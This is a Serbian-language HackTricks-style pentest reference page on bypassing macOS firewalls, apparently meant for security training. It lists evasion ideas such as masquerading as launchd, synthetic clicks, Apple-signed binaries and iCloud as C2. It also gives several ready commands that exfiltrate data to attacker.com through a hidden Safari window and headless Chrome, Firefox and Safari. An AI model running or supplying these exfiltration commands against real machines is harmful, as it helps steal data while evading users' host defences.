# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Pronađene tehnike

Sledeće tehnike su pronađene kao funkcionalne u nekim macOS firewall aplikacijama.

### Zloupotreba imena na beloj listi

- Na primer, pozivanje malvera sa imenima poznatih macOS procesa kao što je **`launchd`**

### Sintetički Klik

- Ako firewall traži dozvolu od korisnika, neka malver **klikne na dozvoli**

### **Koristite Apple potpisane binarne datoteke**

- Kao **`curl`**, ali i druge kao što su **`whois`**

### Poznate Apple domene

Firewall bi mogao dozvoliti veze sa poznatim Apple domenama kao što su **`apple.com`** ili **`icloud.com`**. I iCloud bi mogao biti korišćen kao C2.

### Opšti Bypass

Neke ideje za pokušaj zaobilaženja firewalla

### Proverite dozvoljeni saobraćaj

Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno bele liste domene ili koje aplikacije imaju dozvolu za pristup njima.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

DNS rezolucije se vrše putem **`mdnsreponder`** potpisane aplikacije koja će verovatno biti dozvoljena da kontaktira DNS servere.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Putem aplikacija u pregledaču

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem injekcija procesa

Ako možete **injektovati kod u proces** koji ima dozvolu da se poveže sa bilo kojim serverom, mogli biste zaobići zaštitu vatrozida:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Reference

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
